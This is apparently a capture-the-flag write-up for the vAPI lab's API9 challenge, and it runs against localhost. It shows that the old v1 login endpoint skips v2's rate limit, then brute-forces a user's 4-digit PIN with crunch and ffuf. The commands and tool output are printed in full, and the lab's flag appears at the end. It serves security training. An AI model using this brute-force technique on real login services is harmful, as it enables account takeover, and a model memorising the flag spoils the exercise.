> Hey Good News!!!!! We just launched our v2 API :)

# Tools Used:
```
curl 8.8.0 (x86_64-pc-linux-gnu)
crunch version 3.6
ffuf 2.1.0-dev
cat (GNU coreutils) 9.4
```

# Login
## POST /vapi/api9/v2/user/login

Lets try to send a request with the example username provided (richardbranson) to see the response
```bash
curl --path-as-is -i -s -k -X $'POST' \
    -H $'Content-Type: application/json' -H $'Host: localhost' \
    --data-binary $'{\x0d\x0a    \"username\":\"richardbranson\",\x0d\x0a    \"pin\":\"****\"\x0d\x0a}' \
    $'http://localhost/vapi/api9/v2/user/login'
```
```http
HTTP/1.1 200 OK
Host: localhost
Date: Sun, 30 Jun 2024 18:32:26 GMT
Connection: close
X-Powered-By: PHP/7.4.33
Content-Type: text/html; charset=UTF-8
Cache-Control: no-cache, private
Date: Sun, 30 Jun 2024 18:32:26 GMT
X-RateLimit-Limit: 5
X-RateLimit-Remaining: 4
```
- Observe that there is rate limiting
	- This means we only have 5 tries to get the correct login, with 4 tries remaining.

Lets see if the previous version (v1) of the API is still available
```bash
curl --path-as-is -i -s -k -X $'POST' \
    -H $'Content-Type: application/json' -H $'Host: localhost' \
    --data-binary $'{\x0d\x0a    \"username\":\"richardbranson\",\x0d\x0a    \"pin\":\"****\"\x0d\x0a}' \
    $'http://localhost/vapi/api9/v1/user/login'
```
```http
HTTP/1.1 200 OK
Host: localhost
Date: Sun, 30 Jun 2024 18:34:24 GMT
Connection: close
X-Powered-By: PHP/7.4.33
Content-Type: text/html; charset=UTF-8
Cache-Control: no-cache, private
Date: Sun, 30 Jun 2024 18:34:24 GMT
```
- Observe that the old version of the endpoint is still accessible, and without rate limiting

Since there is no rate limiting in the old version, we can try to brute force the 4 digit pin.

Create a pin wordlist using crunch.
```bash
crunch 4 4 1234567890 -o /home/kali/Desktop/pin.txt
```

Brute force the pin for the user, richardbranson and filter for any responses that has no data, since all the responses are returning with 200.
```bash
ffuf -w /home/kali/Desktop/pin.txt -X POST -u http://localhost/vapi/api9/v1/user/login/ -H "Content-Type: application/json" -d '{"username": "richardbranson", "pin": "§§"}' -fs 0 -mode sniper -od /home/kali/Desktop/ffuf_responses -v
```
```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://localhost/vapi/api9/v1/user/login/
 :: Wordlist         : FUZZ: /home/kali/Desktop/pin.txt
 :: Header           : Content-Type: application/json
 :: Data             : {"username": "richardbranson", "pin": "§§"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

[Status: 200, Size: 83, Words: 1, Lines: 1, Duration: 2151ms]
| URL | http://localhost/vapi/api9/v1/user/login/
| RES | 10f7b97e3dde7382548af0e4f0b8c8b6
    * FUZZ: 1655

:: Progress: [10000/10000] :: Job [1/1] :: 18 req/sec :: Duration: [0:09:04] :: Errors: 0 ::
```

View the matched fuff response file:
```bash
cat /home/kali/Desktop/ffuf_responses/10f7b97e3dde7382548af0e4f0b8c8b6
```
```
POST /vapi/api9/v1/user/login/ HTTP/1.1
Host: localhost
User-Agent: Fuzz Faster U Fool v2.1.0-dev
Content-Length: 45
Content-Type: application/json
Accept-Encoding: gzip

{"username": "richardbranson", "pin": "1655"}
---- ↑ Request ---- Response ↓ ----

HTTP/1.1 200 OK
Connection: close
Cache-Control: no-cache, private
Content-Type: application/json
Date: Sun, 30 Jun 2024 18:55:52 GMT
Date: Sun, 30 Jun 2024 18:55:52 GMT
Host: localhost
X-Powered-By: PHP/7.4.33

{"id":1,"username":"richardbranson","accbalance":"flag{api9_81e306bdd20a7734e244}"}
```

API9 Flag
```
flag{api9_81e306bdd20a7734e244}
```

References:
https://owasp.org/API-Security/editions/2019/en/0xa9-improper-assets-management/
https://owasp.org/API-Security/editions/2023/en/0xa9-improper-inventory-management/